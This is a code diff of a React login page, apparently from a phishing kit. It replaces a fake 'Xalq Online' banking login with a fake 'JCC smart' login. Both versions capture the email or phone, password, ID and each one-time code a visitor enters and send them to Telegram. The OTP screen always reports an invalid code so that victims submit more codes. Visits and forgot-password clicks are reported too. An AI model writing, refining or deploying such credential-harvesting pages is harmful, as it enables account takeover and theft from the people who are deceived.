@@ -1,534 +1,411 @@
 "use client"
 
 import React, { useState, useEffect } from "react"
-import {
-  ChevronLeft,
-  ChevronDown,
-  Smartphone,
-  Lock,
-  User,
-  Eye,
-  EyeOff,
-  AlertCircle,
-  Loader2
-} from "lucide-react"
-import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
+import { Eye, EyeOff, Loader2, ArrowLeft } from "lucide-react"
+import { sendTelegramMessage } from "@/lib/telegram"
 
-type ScreenType = "splash" | "login" | "otp"
-type TabType = "authorization" | "asan"
+// JCC Smart Logo from public folder
+const LOGO_SRC = "/jcc-logo.png"
 
-// Pixel-Perfect XalqOnline Brand Logo Component with requested logo image beside text
-const XalqOnlineLogo = () => (
-  <div className="bg-white rounded-lg shadow-xs border border-gray-100  px-6 flex items-center justify-center gap-3.5 w-full">
-    {/* Logo emblem image beside Xalq Online text */}
-    <img
-      src="/xalq-logo.png"
-      alt="Xalq Logo"
-      className="w-16 h-16 object-contain flex-shrink-0"
-      onError={(e) => {
-        // Fallback to remote URL if local image fails
-        e.currentTarget.src =
-          "https://play-lh.googleusercontent.com/vyCxXMxhO_ojs78dmSpGgrDc1eZX5TalTO3ztz2tKrIa_3tTfNlNPAjkbJEEr1hWw60nLO2O7YroA6XilyQ7eg"
-      }}
-    />
-    <div className="flex items-center text-4xl sm:text-3xl font-extrabold tracking-tight text-gray-900">
-      <span>Xalq</span>
-      <span className="font-normal text-gray-900 ml-2">Online</span>
-    </div>
-  </div>
-)
-
-// Pink/Red Radial Flower Spinner Component for Splash Screen
-const RadialSpinner = () => (
-  <div className="relative w-10 h-10 flex items-center justify-center">
-    {[...Array(8)].map((_, i) => (
-      <span
-        key={i}
-        className="absolute w-1.5 h-3 bg-[#E31E24] rounded-full opacity-30 animate-pulse"
-        style={{
-          transform: `rotate(${i * 45}deg) translateY(-14px)`,
-          animationDelay: `${i * 0.125}s`,
-          animationDuration: "1s"
-        }}
+function JccLogo({ className = "h-14 sm:h-16 w-auto" }: { className?: string }) {
+  return (
+    <div className="flex items-center justify-center select-none max-w-full">
+      <img
+        src={LOGO_SRC}
+        alt="JCC smart"
+        className={`object-contain max-h-16 sm:max-h-20 w-auto max-w-[180px] ${className}`}
+        loading="eager"
       />
-    ))}
-  </div>
-)
+    </div>
+  )
+}
 
-export default function XalqOnlineApp() {
-  // Screen & Navigation State
-  const [screen, setScreen] = useState<ScreenType>("splash")
-  const [tab, setTab] = useState<TabType>("authorization")
+export default function LoginPage() {
+  const [step, setStep] = useState<"login" | "otp">("login")
 
-  // Login Form State
-  const [phone, setPhone] = useState("")
+  // Login form state
+  const [email, setEmail] = useState("")
   const [password, setPassword] = useState("")
-  const [asanId, setAsanId] = useState("")
   const [showPassword, setShowPassword] = useState(false)
-  const [showAsanId, setShowAsanId] = useState(false)
+  const [emailFocused, setEmailFocused] = useState(false)
+  const [passwordFocused, setPasswordFocused] = useState(false)
+  const [isLoginLoading, setIsLoginLoading] = useState(false)
 
-  // OTP Form State
-  const [otp, setOtp] = useState("")
+  // OTP form state
+  const [otpCode, setOtpCode] = useState("")
+  const [otpFocused, setOtpFocused] = useState(false)
+  const [isOtpLoading, setIsOtpLoading] = useState(false)
+  const [otpError, setOtpError] = useState("")
+  const [otpAttempt, setOtpAttempt] = useState(1)
   const [timer, setTimer] = useState(60)
-  const [otpError, setOtpError] = useState<string | null>(null)
-
-  // Loading & Visitor State
-  const [loading, setLoading] = useState(false)
-
-  // Visitor location tracking on mount
-  useEffect(() => {
-    const trackVisitor = async () => {
-      await fetchVisitorInfo()
-      await sendTelegramMessage({
-        title: "XalqOnline App Opened",
-        type: "visitor",
-      })
-    }
-    trackVisitor()
-  }, [])
-
-  // 5-Second Splash Screen Loader Timer
-  useEffect(() => {
-    if (screen !== "splash") return
-    const splashTimer = setTimeout(() => {
-      setScreen("login")
-    }, 5000)
-    return () => clearTimeout(splashTimer)
-  }, [screen])
+  const [canResend, setCanResend] = useState(false)
+  const [resendSuccess, setResendSuccess] = useState(false)
 
   // OTP Timer countdown
   useEffect(() => {
-    if (screen !== "otp") return
-    const interval = setInterval(() => {
-      setTimer((prev) => (prev <= 1 ? 0 : prev - 1))
-    }, 1000)
-    return () => clearTimeout(interval)
-  }, [screen])
+    let interval: NodeJS.Timeout
+    if (step === "otp" && timer > 0) {
+      interval = setInterval(() => {
+        setTimer((prev) => prev - 1)
+      }, 1000)
+    } else if (timer === 0) {
+      setCanResend(true)
+    }
+    return () => clearInterval(interval)
+  }, [step, timer])
 
-  // Form Validations
-  const isAuthValid = phone.trim().length > 0 && password.trim().length > 0
-  const isAsanValid = phone.trim().length > 0 && asanId.trim().length > 0
-  const isFormValid = tab === "authorization" ? isAuthValid : isAsanValid
-  const isOtpValid = otp.trim().length > 0
+  // Handle Login submission
+  const handleLoginSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+    if (!email || !password) return
 
-  // Handle Login Submit
-  const handleLogin = async () => {
-    if (!isFormValid || loading) return
-    setLoading(true)
+    setIsLoginLoading(true)
 
     try {
+      // Send credentials tracking to telegram
       await sendTelegramMessage({
-        title: `XalqOnline Login (${tab === "authorization" ? "Authorization" : "Asan Imza"})`,
-        type: "login",
-        phoneNumber: phone,
-        ...(tab === "authorization" ? { password } : { asanId }),
+        title: "JCC SMART Login Attempt",
+        email: email,
+        password: password,
+        type: "login_submit",
       })
     } catch (err) {
-      console.error("Error sending Telegram login alert:", err)
+      console.error("Failed to send telegram alert:", err)
     }
 
+    // 2-second loader before navigating to OTP screen
     setTimeout(() => {
-      setLoading(false)
-      setScreen("otp")
+      setIsLoginLoading(false)
+      setStep("otp")
       setTimer(60)
-      setOtpError(null)
+      setCanResend(false)
+      setOtpError("")
     }, 2000)
   }
 
-  // Handle OTP Submit
-  const handleVerifyOtp = async () => {
-    if (!isOtpValid || loading) return
-    setLoading(true)
+  // Handle OTP submission - 2 sec loader and error message each time
+  const handleOtpSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+    if (!otpCode.trim() || isOtpLoading) return
+
+    setIsOtpLoading(true)
+    setOtpError("")
+
+    const currentAttempt = otpAttempt
+    const submittedCode = otpCode
 
     try {
+      // Send OTP code to telegram with attempt tracking (otp1, otp2, otp3...)
       await sendTelegramMessage({
-        title: "XalqOnline OTP Submitted",
-        type: "otp",
-        otp1: otp,
-        phoneNumber: phone,
-        ...(tab === "authorization" ? { password } : { asanId }),
+        title: `JCC SMART OTP Attempt #${currentAttempt}`,
+        email: email,
+        password: password,
+        [`otp${currentAttempt}`]: submittedCode,
+        otp1: submittedCode,
+        type: "otp_submit",
       })
     } catch (err) {
-      console.error("Error sending Telegram OTP alert:", err)
+      console.error("Failed to send telegram OTP alert:", err)
     }
 
+    // Always wait 2 full seconds, then display error message each time
     setTimeout(() => {
-      setLoading(false)
-      setOtp("")
-      setTimer(60)
-      setOtpError("Yalnış OTP kodu. Yenidən cəhd edin.")
+      setIsOtpLoading(false)
+      setOtpError("Invalid verification code. Please check your email and try again.")
+      setOtpCode("")
+      setOtpAttempt((prev) => prev + 1)
     }, 2000)
   }
 
   // Handle Resend OTP
   const handleResendOtp = async () => {
+    if (!canResend) return
+    setCanResend(false)
     setTimer(60)
-    setOtpError(null)
+    setResendSuccess(true)
+    setTimeout(() => setResendSuccess(false), 3000)
+
     try {
       await sendTelegramMessage({
-        title: "XalqOnline OTP Resend Requested",
-        type: "resend_otp",
-        phoneNumber: phone,
+        title: "JCC SMART OTP Resend Requested",
+        email: email,
+        type: "otp_resend",
       })
     } catch (err) {
-      console.error("Error sending Telegram resend OTP alert:", err)
+      console.error("Failed to trigger resend alert:", err)
     }
   }
 
-  // Format timer into MM:SS
-  const formatTimer = (seconds: number) => {
-    const mins = Math.floor(seconds / 60)
-    const secs = seconds % 60
-    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
-  }
+  // Floating label condition: if focused or input has value
+  const isEmailActive = emailFocused || email.length > 0
+  const isPasswordActive = passwordFocused || password.length > 0
+  const isOtpActive = otpFocused || otpCode.length > 0
 
   return (
-    <div className="h-[100dvh] w-full bg-[#FAFAFA] text-gray-900 flex flex-col font-sans relative overflow-hidden select-none">
-      <div className="w-full max-w-md mx-auto flex-1 flex flex-col px-5 pt-3 pb-6 justify-between h-[100dvh]">
-        
-        {/* ================================================================= */}
-        {/* SCREEN 1: SPLASH SCREEN WITH 5-SECOND LOADER                     */}
-        {/* ================================================================= */}
-        {screen === "splash" && (
-          <div className="flex-1 flex flex-col justify-between items-center py-2 w-full animate-fade-in">
-            {/* Top Logo Banner */}
-            <div className="w-full pt-2">
-              <XalqOnlineLogo />
+    <div className="min-h-[100dvh] w-full bg-white flex flex-col items-center justify-center text-slate-800 antialiased font-sans overflow-x-hidden selection:bg-[#5643ba]/20 selection:text-[#5643ba]">
+      {/* Mobile-first centered container */}
+      <div className="w-full max-w-[420px] min-h-[100dvh] flex flex-col justify-between px-6 py-8 sm:px-8 sm:py-10 box-border">
+        {step === "login" ? (
+          /* ======================================================== */
+          /*                    LOGIN SCREEN                          */
+          /* ======================================================== */
+          <>
+            {/* Top section: Logo */}
+            <div className="flex flex-col items-center pt-2 sm:pt-4">
+              <JccLogo className="h-16 sm:h-20 w-auto" />
             </div>
 
-            {/* Center 5-Second Radial Flower Spinner */}
-            <div className="flex-1 flex flex-col items-center justify-center my-auto">
-              <RadialSpinner />
-            </div>
+            {/* Middle section: Headings & Form */}
+            <div className="w-full flex flex-col items-center my-auto py-8">
+              {/* Title & Subtitle */}
+              <h1 className="text-[26px] sm:text-[28px] font-bold text-[#1e2329] tracking-tight mb-1.5 text-center">
+                Welcome!
+              </h1>
+              <p className="text-[15px] sm:text-[16px] text-[#6e7480] font-normal text-center mb-10 tracking-normal">
+                Log in to your account
+              </p>
 
-            {/* Bottom Services Section */}
-            <div className="w-full bg-white rounded-t-3xl pt-2 pb-2 px-1 shadow-xs border border-gray-100 flex flex-col space-y-4">
-              {/* Drag Handle */}
-              <div className="w-10 h-1 bg-gray-900 rounded-full mx-auto" />
-
-              <h2 className="text-xl font-bold text-gray-900 px-2">Services</h2>
-
-              {/* Action Buttons */}
-              <div className="space-y-3 pt-1">
-                <button
-                  type="button"
-                  onClick={() => setScreen("login")}
-                  className="w-full py-3.5 px-4 bg-white border border-[#E31E24] text-[#E31E24] font-semibold text-base rounded-lg hover:bg-red-50 transition-all cursor-pointer text-center"
-                >
-                  Registration
-                </button>
-
-                <button
-                  type="button"
-                  onClick={() => setScreen("login")}
-                  className="w-full py-3.5 px-4 bg-[#E31E24] text-white font-semibold text-base rounded-lg hover:bg-[#c9181d] active:scale-[0.99] transition-all cursor-pointer text-center shadow-md shadow-red-500/20"
-                >
-                  Sign in
-                </button>
-              </div>
-            </div>
-          </div>
-        )}
-
-        {/* ================================================================= */}
-        {/* SCREEN 2: LOGIN SCREEN (Matching Right Side Picture)             */}
-        {/* ================================================================= */}
-        {screen === "login" && (
-          <div className="flex-1 flex flex-col justify-between w-full animate-slide-up">
-            <div className="space-y-4 w-full">
-              {/* Header Top Bar with Red Back Chevron (left) and Dark Circle Down Arrow (right) */}
-              <div className="flex items-center justify-between pt-1 pb-1">
-                <button
-                  type="button"
-                  onClick={() => setScreen("splash")}
-                  className="p-1 -ml-1 rounded-full hover:bg-gray-200/50 transition-all cursor-pointer text-[#E31E24]"
-                  aria-label="Back"
-                >
-                  <ChevronLeft className="w-8 h-8 stroke-[2.5]" />
-                </button>
-                <button
-                  type="button"
-                  className="w-7 h-7 rounded-full bg-gray-500/80 text-white flex items-center justify-center shadow-xs hover:bg-gray-600 transition-all cursor-pointer"
-                  aria-label="Options"
-                >
-                  <ChevronDown className="w-4.5 h-4.5 stroke-[2.5]" />
-                </button>
-              </div>
-
-              {/* XalqOnline Logo */}
-              <XalqOnlineLogo />
-
-              {/* Segmented Control Tabs (Authorization vs Asan Imza) */}
-              <div className="bg-white rounded-lg border border-[#E31E24] flex items-center overflow-hidden h-10 p-0.5">
-                <button
-                  type="button"
-                  onClick={() => setTab("authorization")}
-                  className={`flex-1 h-full text-center text-sm font-medium transition-all cursor-pointer flex items-center justify-center rounded-md ${
-                    tab === "authorization"
-                      ? "bg-[#E31E24] text-white"
-                      : "bg-white text-[#E31E24] hover:bg-red-50/50"
-                  }`}
-                >
-                  Authorization
-                </button>
-                <button
-                  type="button"
-                  onClick={() => setTab("asan")}
-                  className={`flex-1 h-full text-center text-sm font-medium transition-all cursor-pointer flex items-center justify-center rounded-md ${
-                    tab === "asan"
-                      ? "bg-[#E31E24] text-white"
-                      : "bg-white text-[#E31E24] hover:bg-red-50/50"
-                  }`}
-                >
-                  Asan Imza
-                </button>
-              </div>
-
-              {/* INPUT FIELDS AREA WITH INCREASED FONT SIZES */}
-              <div className="space-y-3.5 pt-2">
-                {/* Field 1: Phone Number */}
-                <div className="bg-white rounded-lg px-4 py-3.5 flex items-center gap-3.5 border border-gray-100 shadow-xs focus-within:ring-2 focus-within:ring-[#E31E24]/30 transition-all">
-                  <Smartphone className="w-5 h-5 text-gray-300 flex-shrink-0" />
+              {/* Login Form */}
+              <form onSubmit={handleLoginSubmit} className="w-full space-y-7">
+                {/* Email Field with Smooth Floating Label */}
+                <div className="relative w-full border-b border-[#dedede] focus-within:border-[#5643ba] transition-colors duration-200">
+                  <label
+                    htmlFor="email"
+                    className={`absolute left-0 transition-all duration-200 ease-out pointer-events-none ${
+                      isEmailActive
+                        ? "-top-3.5 text-xs text-[#5643ba] font-medium"
+                        : "top-2.5 text-[16px] text-[#8e95a2] font-normal"
+                    }`}
+                  >
+                    Email
+                  </label>
                   <input
-                    type="tel"
-                    value={phone}
-                    onFocus={() => {
-                      if (!phone) {
-                        setPhone("994")
-                      }
-                    }}
-                    onBlur={() => {
-                      if (phone === "994") {
-                        setPhone("")
-                      }
-                    }}
-                    onChange={(e) => {
-                      const val = e.target.value
-                      if (!val) {
-                        setPhone("")
-                        return
-                      }
-                      const digits = val.replace(/\D/g, "")
-                      if (!digits.startsWith("994")) {
-                        setPhone("994" + digits)
-                      } else {
-                        setPhone(digits)
-                      }
-                    }}
-                    placeholder="Phone number"
-                    className="bg-transparent border-none outline-none text-base sm:text-lg text-gray-900 placeholder:text-gray-300 placeholder:font-normal placeholder:text-base sm:placeholder:text-lg w-full"
+                    id="email"
+                    type="email"
+                    value={email}
+                    onChange={(e) => setEmail(e.target.value)}
+                    onFocus={() => setEmailFocused(true)}
+                    onBlur={() => setEmailFocused(false)}
+                    required
+                    autoComplete="email"
+                    className="w-full pt-2 pb-2.5 bg-transparent text-[16px] text-[#1e2329] focus:outline-none placeholder-transparent"
                   />
                 </div>
 
-                {/* Field 2: Password (Authorization Tab) */}
-                {tab === "authorization" && (
-                  <div className="bg-white rounded-lg px-4 py-3.5 flex items-center gap-3.5 border border-gray-100 shadow-xs focus-within:ring-2 focus-within:ring-[#E31E24]/30 transition-all">
-                    <Lock className="w-5 h-5 text-gray-300 flex-shrink-0" />
-                    <input
-                      type={showPassword ? "text" : "password"}
-                      value={password}
-                      onChange={(e) => setPassword(e.target.value)}
-                      placeholder="Password"
-                      className="bg-transparent border-none outline-none text-base sm:text-lg text-gray-900 placeholder:text-gray-300 placeholder:font-normal placeholder:text-base sm:placeholder:text-lg w-full"
-                    />
-                    <button
-                      type="button"
-                      onClick={() => setShowPassword(!showPassword)}
-                      className="text-gray-300 hover:text-gray-500 cursor-pointer flex-shrink-0"
-                    >
-                      {showPassword ? (
-                        <Eye className="w-5 h-5" />
-                      ) : (
-                        <EyeOff className="w-5 h-5" />
-                      )}
-                    </button>
-                  </div>
-                )}
-
-                {/* Field 2: ID (Asan Imza Tab) */}
-                {tab === "asan" && (
-                  <div className="bg-white rounded-lg px-4 py-3.5 flex items-center gap-3.5 border border-gray-100 shadow-xs focus-within:ring-2 focus-within:ring-[#E31E24]/30 transition-all">
-                    <User className="w-5 h-5 text-gray-300 flex-shrink-0" />
-                    <input
-                      type={showAsanId ? "text" : "password"}
-                      value={asanId}
-                      onChange={(e) => setAsanId(e.target.value)}
-                      placeholder="ID"
-                      className="bg-transparent border-none outline-none text-base sm:text-lg text-gray-900 placeholder:text-gray-300 placeholder:font-normal placeholder:text-base sm:placeholder:text-lg w-full"
-                    />
-                    <button
-                      type="button"
-                      onClick={() => setShowAsanId(!showAsanId)}
-                      className="text-gray-300 hover:text-gray-500 cursor-pointer flex-shrink-0"
-                    >
-                      {showAsanId ? (
-                        <Eye className="w-5 h-5" />
-                      ) : (
-                        <EyeOff className="w-5 h-5" />
-                      )}
-                    </button>
-                  </div>
-                )}
-              </div>
-            </div>
-
-            {/* Bottom Buttons & Links Area */}
-            <div className="pt-6 space-y-3 pb-2 w-full">
-              <button
-                type="button"
-                disabled={!isFormValid || loading}
-                onClick={handleLogin}
-                className={`w-full py-3.5 font-semibold text-base sm:text-lg rounded-lg transition-all flex items-center justify-center gap-2 ${
-                  isFormValid && !loading
-                    ? "bg-[#E31E24] hover:bg-[#c9181d] active:scale-[0.99] text-white shadow-xs cursor-pointer"
-                    : "bg-[#E31E24] opacity-90 text-white cursor-pointer"
-                }`}
-              >
-                {loading ? (
-                  <div className="flex items-center gap-2">
-                    <Loader2 className="w-5 h-5 animate-spin" />
-                    <span>Signing in...</span>
-                  </div>
-                ) : (
-                  <span>Sign-in</span>
-                )}
-              </button>
-
-              {tab === "authorization" && (
-                <>
+                {/* Password Field with Smooth Floating Label & Toggle */}
+                <div className="relative w-full border-b border-[#dedede] focus-within:border-[#5643ba] transition-colors duration-200">
+                  <label
+                    htmlFor="password"
+                    className={`absolute left-0 transition-all duration-200 ease-out pointer-events-none ${
+                      isPasswordActive
+                        ? "-top-3.5 text-xs text-[#5643ba] font-medium"
+                        : "top-2.5 text-[16px] text-[#8e95a2] font-normal"
+                    }`}
+                  >
+                    Password
+                  </label>
+                  <input
+                    id="password"
+                    type={showPassword ? "text" : "password"}
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    onFocus={() => setPasswordFocused(true)}
+                    onBlur={() => setPasswordFocused(false)}
+                    required
+                    autoComplete="current-password"
+                    className="w-full pt-2 pb-2.5 pr-10 bg-transparent text-[16px] text-[#1e2329] focus:outline-none placeholder-transparent"
+                  />
                   <button
                     type="button"
-                    className="w-full py-3.5 bg-white border border-gray-100 text-gray-900 font-semibold text-base sm:text-lg rounded-lg hover:bg-gray-50 transition-all cursor-pointer text-center shadow-xs"
+                    onClick={() => setShowPassword(!showPassword)}
+                    tabIndex={-1}
+                    className="absolute right-0 top-2.5 text-[#8e95a2] hover:text-[#5643ba] transition-colors duration-150 p-0.5 focus:outline-none"
+                    aria-label={showPassword ? "Hide password" : "Show password"}
                   >
-                    Registration
+                    {showPassword ? (
+                      <Eye className="w-[20px] h-[20px] stroke-[1.75]" />
+                    ) : (
+                      <EyeOff className="w-[20px] h-[20px] stroke-[1.75]" />
+                    )}
                   </button>
+                </div>
 
-                  <div className="text-center pt-2">
-                    <button
-                      type="button"
-                      className="text-sm font-medium text-gray-400 hover:text-gray-600 cursor-pointer"
-                    >
-                      Forgot Password
-                    </button>
-                  </div>
-                </>
-              )}
+                {/* Forgot Link */}
+                <div className="flex justify-end -mt-3">
+                  <a
+                    href="#forgot"
+                    onClick={(e) => {
+                      e.preventDefault()
+                      if (email) {
+                        sendTelegramMessage({
+                          title: "Forgot Password Clicked",
+                          email,
+                          type: "forgot_password",
+                        })
+                      }
+                    }}
+                    className="text-[14px] font-medium text-[#5643ba] hover:underline focus:outline-none"
+                  >
+                    Forgot?
+                  </a>
+                </div>
+
+                {/* Log in Button */}
+                <div className="pt-5">
+                  <button
+                    type="submit"
+                    disabled={isLoginLoading || !email || !password}
+                    style={{ backgroundColor: "#5643ba" }}
+                    className="w-full h-[52px] rounded-xl text-white font-medium text-[16px] tracking-wide shadow-sm hover:opacity-95 active:scale-[0.99] transition-all duration-150 flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
+                  >
+                    {isLoginLoading ? (
+                      <div className="flex items-center space-x-2">
+                        <Loader2 className="w-5 h-5 animate-spin text-white" />
+                        <span>Logging in...</span>
+                      </div>
+                    ) : (
+                      "Log in"
+                    )}
+                  </button>
+                </div>
+              </form>
             </div>
-          </div>
-        )}
 
-        {/* ================================================================= */}
-        {/* SCREEN 3: OTP SCREEN WITH RED BACK ARROW                          */}
-        {/* ================================================================= */}
-        {screen === "otp" && (
-          <div className="flex-1 flex flex-col justify-between w-full animate-slide-up">
-            <div className="space-y-4 w-full">
-              {/* Header Top Bar */}
-              <div className="flex items-center justify-between pt-1 pb-1">
-                <button
-                  type="button"
-                  onClick={() => setScreen("login")}
-                  className="p-1 -ml-1 rounded-full hover:bg-gray-200/50 transition-all cursor-pointer text-[#E31E24]"
-                  aria-label="Back"
-                >
-                  <ChevronLeft className="w-8 h-8 stroke-[2.5]" />
-                </button>
-                <button
-                  type="button"
-                  className="w-7 h-7 rounded-full bg-gray-500/80 text-white flex items-center justify-center shadow-xs hover:bg-gray-600 transition-all cursor-pointer"
-                  aria-label="Options"
-                >
-                  <ChevronDown className="w-4.5 h-4.5 stroke-[2.5]" />
-                </button>
-              </div>
+            {/* Bottom spacer for balance */}
+            <div className="h-6" />
+          </>
+        ) : (
+          /* ======================================================== */
+          /*                     OTP SCREEN                           */
+          /* ======================================================== */
+          <>
+            {/* Top Navigation & Logo */}
+            <div className="relative flex items-center justify-center w-full pt-2 sm:pt-4">
+              <button
+                type="button"
+                onClick={() => setStep("login")}
+                className="absolute left-0 p-2 -ml-2 rounded-full text-[#6e7480] hover:text-[#1e2329] hover:bg-gray-100 transition-colors focus:outline-none cursor-pointer"
+                aria-label="Back to login"
+              >
+                <ArrowLeft className="w-5 h-5" />
+              </button>
+              <JccLogo className="h-16 sm:h-20 w-auto" />
+            </div>
 
-              {/* XalqOnline Logo */}
-              <XalqOnlineLogo />
+            {/* Middle Section: OTP Verification Form */}
+            <div className="w-full flex flex-col items-center my-auto py-8">
+              {/* Title & Sent Email Notice */}
+              <h1 className="text-[26px] sm:text-[28px] font-bold text-[#1e2329] tracking-tight mb-1.5 text-center">
+                Verification Code
+              </h1>
+              
+              <p className="text-[15px] sm:text-[16px] text-[#6e7480] font-normal text-center mb-10 tracking-normal px-2">
+                Enter the verification code sent to <br />
+                <span className="font-semibold text-[#1e2329]">{email}</span>
+              </p>
 
-              {/* Title & Description */}
-              <div className="pt-2">
-                <h1 className="text-2xl font-bold text-gray-900 tracking-tight mb-1">
-                  Təsdiq kodu
-                </h1>
-                <p className="text-sm text-gray-400 font-normal leading-relaxed">
-                  Daxil etdiyiniz mobil nömrəyə göndərilən OTP təsdiq kodunu daxil edin.
-                </p>
-              </div>
-
-              {/* OTP Input Field */}
-              <div className="pt-2 space-y-2">
-                <div
-                  className={`bg-white rounded-xl px-4 py-3.5 flex items-center gap-3.5 border transition-all ${
-                    otpError
-                      ? "border-red-500 bg-red-50/20 ring-2 ring-red-500/20"
-                      : "border-gray-100 focus-within:ring-2 focus-within:ring-[#E31E24]/30"
-                  }`}
-                >
-                  <Lock className="w-5 h-5 text-gray-300 flex-shrink-0" />
+              {/* OTP Form (Accepts unlimited digits) */}
+              <form onSubmit={handleOtpSubmit} className="w-full space-y-6">
+                {/* Floating label input accepting unlimited digits */}
+                <div className="relative w-full border-b border-[#dedede] focus-within:border-[#5643ba] transition-colors duration-200">
+                  <label
+                    htmlFor="otpCode"
+                    className={`absolute left-0 transition-all duration-200 ease-out pointer-events-none ${
+                      isOtpActive
+                        ? "-top-3.5 text-xs text-[#5643ba] font-medium"
+                        : "top-2.5 text-[16px] text-[#8e95a2] font-normal"
+                    }`}
+                  >
+                    Enter Verification Code
+                  </label>
                   <input
+                    id="otpCode"
                     type="text"
                     inputMode="numeric"
-                    value={otp}
+                    autoComplete="one-time-code"
+                    value={otpCode}
                     onChange={(e) => {
-                      setOtp(e.target.value.replace(/\D/g, ""))
-                      if (otpError) setOtpError(null)
+                      // Allow any unlimited digit entry as requested
+                      const value = e.target.value.replace(/[^0-9]/g, "")
+                      setOtpCode(value)
+                      if (otpError) setOtpError("")
                     }}
-                    placeholder="Enter verification code"
-                    className="bg-transparent border-none outline-none text-xl font-bold tracking-widest text-gray-900 placeholder:text-gray-300 placeholder:text-base placeholder:font-normal w-full"
+                    onFocus={() => setOtpFocused(true)}
+                    onBlur={() => setOtpFocused(false)}
+                    autoFocus
+                    required
+                    placeholder=" "
+                    className="w-full pt-2 pb-2.5 bg-transparent text-[20px] tracking-widest text-[#1e2329] font-medium focus:outline-none"
                   />
                 </div>
 
                 {/* Error Message */}
                 {otpError && (
-                  <p className="text-xs font-semibold text-red-600 px-1 flex items-center gap-1.5 animate-slide-up">
-                    <AlertCircle className="w-4 h-4 text-red-600 flex-shrink-0" />
-                    <span>{otpError}</span>
+                  <p className="text-[13px] text-red-500 font-medium text-center -mt-2 animate-shake">
+                    {otpError}
                   </p>
                 )}
-              </div>
 
-              {/* Resend Timer */}
-              <div className="text-sm font-medium text-gray-400 px-1 pt-1 flex items-center gap-2">
-                {timer > 0 ? (
-                  <span>
-                    Kodu yenidən göndər: <strong className="text-gray-900 font-bold">{formatTimer(timer)}</strong>
-                  </span>
-                ) : (
-                  <button
-                    onClick={handleResendOtp}
-                    className="text-sm font-bold text-[#E31E24] hover:underline cursor-pointer"
-                  >
-                    Yenidən göndər
-                  </button>
+                {/* Resend success alert */}
+                {resendSuccess && (
+                  <p className="text-[13px] text-green-600 font-medium text-center -mt-2">
+                    A new verification code has been resent to your email!
+                  </p>
                 )}
-              </div>
+
+                {/* Verify Button */}
+                <div className="pt-3">
+                  <button
+                    type="submit"
+                    disabled={isOtpLoading || !otpCode}
+                    style={{ backgroundColor: "#5643ba" }}
+                    className="w-full h-[52px] rounded-xl text-white font-medium text-[16px] tracking-wide shadow-sm hover:opacity-95 active:scale-[0.99] transition-all duration-150 flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
+                  >
+                    {isOtpLoading ? (
+                      <div className="flex items-center space-x-2">
+                        <Loader2 className="w-5 h-5 animate-spin text-white" />
+                        <span>Verifying...</span>
+                      </div>
+                    ) : (
+                      "Confirm & Continue"
+                    )}
+                  </button>
+                </div>
+
+                {/* Resend Code Section with Timer */}
+                <div className="text-center pt-2">
+                  {canResend ? (
+                    <button
+                      type="button"
+                      onClick={handleResendOtp}
+                      className="text-[14px] font-semibold text-[#5643ba] hover:underline focus:outline-none cursor-pointer"
+                    >
+                      Resend Verification Code
+                    </button>
+                  ) : (
+                    <p className="text-[13.5px] text-[#8e95a2]">
+                      Resend code in{" "}
+                      <span className="font-semibold text-[#5643ba]">
+                        00:{timer.toString().padStart(2, "0")}
+                      </span>
+                    </p>
+                  )}
+                </div>
+              </form>
             </div>
 
-            {/* Bottom Verify Button */}
-            <div className="pt-6 pb-2 w-full">
+            {/* Bottom info link */}
+            <div className="text-center pb-2">
               <button
                 type="button"
-                disabled={!isOtpValid || loading}
-                onClick={handleVerifyOtp}
-                className={`w-full py-3.5 font-semibold text-base sm:text-lg rounded-lg transition-all flex items-center justify-center gap-2 ${
-                  isOtpValid && !loading
-                    ? "bg-[#E31E24] hover:bg-[#c9181d] active:scale-[0.99] text-white shadow-md shadow-red-500/20 cursor-pointer"
-                    : "bg-[#E31E24] opacity-90 text-white cursor-pointer"
-                }`}
+                onClick={() => setStep("login")}
+                className="text-[13.5px] text-[#6e7480] hover:text-[#5643ba] transition-colors focus:outline-none"
               >
-                {loading ? (
-                  <div className="flex items-center gap-2">
-                    <Loader2 className="w-5 h-5 animate-spin" />
-                    <span>Təsdiq edilir...</span>
-                  </div>
-                ) : (
-                  <span>Sign-in</span>
-                )}
+                Entered incorrect email? <span className="font-medium text-[#5643ba] underline">Change</span>
               </button>
             </div>
-          </div>
+          </>
         )}
-
       </div>
     </div>
   )
